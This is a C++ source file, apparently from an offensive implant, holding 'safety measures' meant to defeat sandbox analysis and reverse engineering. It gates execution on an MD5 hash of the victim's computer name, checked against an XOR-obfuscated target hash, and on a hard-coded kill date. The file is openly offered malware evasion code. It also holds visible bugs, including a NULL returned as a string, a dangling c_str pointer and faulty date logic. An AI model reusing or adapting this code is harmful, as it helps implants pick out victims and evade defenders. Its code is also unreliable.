// Filename: safety_measures.cpp
// Author: slaeryan
// Version: 1.0(Alpha Release)
// Purpose: This is a source file which contains functions to aid in implant safety. 
// It contains various functions to thwart automated analysis in sandboxing 
// environments and also to make the life of analysts trying to reverse engineer the implant as hard as possible.


#include "safety_measures.h"
#include "xor.h"

// Function to find out the computer name of the executing host.
// Returns the computer name as a string.
std::string getComputerName() {
	char buffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD length = sizeof(buffer);
	bool ok = GetComputerNameEx((COMPUTER_NAME_FORMAT)ComputerNamePhysicalNetBIOS, buffer, &length);
	if (ok) { 
		return buffer;
	}
	return NULL;
}

// Function to generate a MD5 hash.
// Takes a pointer to char containing the data to be hashed and returns a pointer to the MD5 hash.
char* HashMD5(char* data) {
    DWORD dwStatus = 0;
    DWORD cbHash = 16;
    int i = 0;
    HCRYPTPROV cryptProv;
    HCRYPTHASH cryptHash;
    BYTE hash[16];
    char *hex = "0123456789abcdef";
    char *strHash;
    strHash = (char*)malloc(500);
    memset(strHash, '\0', 500);
    if (!CryptAcquireContext(&cryptProv, NULL, MS_DEF_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        return NULL;
    }
    if (!CryptCreateHash(cryptProv, CALG_MD5, 0, 0, &cryptHash)) {
        CryptReleaseContext(cryptProv, 0);
        return NULL;
    }
    if (!CryptHashData(cryptHash, (BYTE*)data, strlen(data), 0)) {
        CryptReleaseContext(cryptProv, 0);
        CryptDestroyHash(cryptHash);
        return NULL;
    }
    if (!CryptGetHashParam(cryptHash, HP_HASHVAL, hash, &cbHash, 0)) {
        CryptReleaseContext(cryptProv, 0);
        CryptDestroyHash(cryptHash);
        return NULL;
    }
    for (i = 0; i < cbHash; i++) {
        strHash[i * 2] = hex[hash[i] >> 4];
        strHash[(i * 2) + 1] = hex[hash[i] & 0xF];
    }
    CryptReleaseContext(cryptProv, 0);
    CryptDestroyHash(cryptHash);
    return strHash;
}

// Function to check whether the executing host is the desired target or not by comparing the hashes of the computer name.
// Returns 0 if matches, otherwise 1.
int checkHost() {
	const char* cn = (const char*)getComputerName().c_str();
	char* cnhash = HashMD5((char*)cn);
    char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // CHANGE ME
    char hash[] = { 0x74, 0x71, 0x75, 0x26, 0x73, 0x74, 0x72, 0x71, 0x78, 0x2e, 0x72, 0x28, 0x28, 0x77, 0x2a, 0x63, 0x63, 0x33, 0x66, 0x63, 0x62, 0x60, 0x6e, 0x60, 0x38, 0x3c, 0x24, 0x21, 0x21, 0x25, 0x72, 0x22 };
    XOR(hash, sizeof(hash), key, sizeof(key));
    std::string sHash;
    int len_hash = sizeof(hash);
    for (int i = 0; i < len_hash; i++) { 
        sHash = sHash + hash[i]; 
    }
    char* targethash = (char*)sHash.c_str();
    int ret = 0;
    if (strcmp(cnhash, targethash) != 0) {
		ret = 1;
	}
	return ret;
}

// Function to check whether the execution date exceeds the implant kill date or not.
// Returns 0 if date is valid, otherwise 1.
int checkDate() {
	SYSTEMTIME ct;
	GetSystemTime(&ct);
	WORD day = ct.wDay;
	WORD month = ct.wMonth;
	WORD year = ct.wYear;
	if ((year == 2020) && (month <= 5) && (day <= 6)) {
        return 0;
	}
	return 1;
}

// Control all the functions that ensure implant safety from here.
// Returns TRUE if host is the intended target, otherwise FALSE.
bool validateEndpoint() {
	if (checkHost() == 1) return FALSE;
	if (checkDate() == 1) return FALSE;
	return TRUE;
}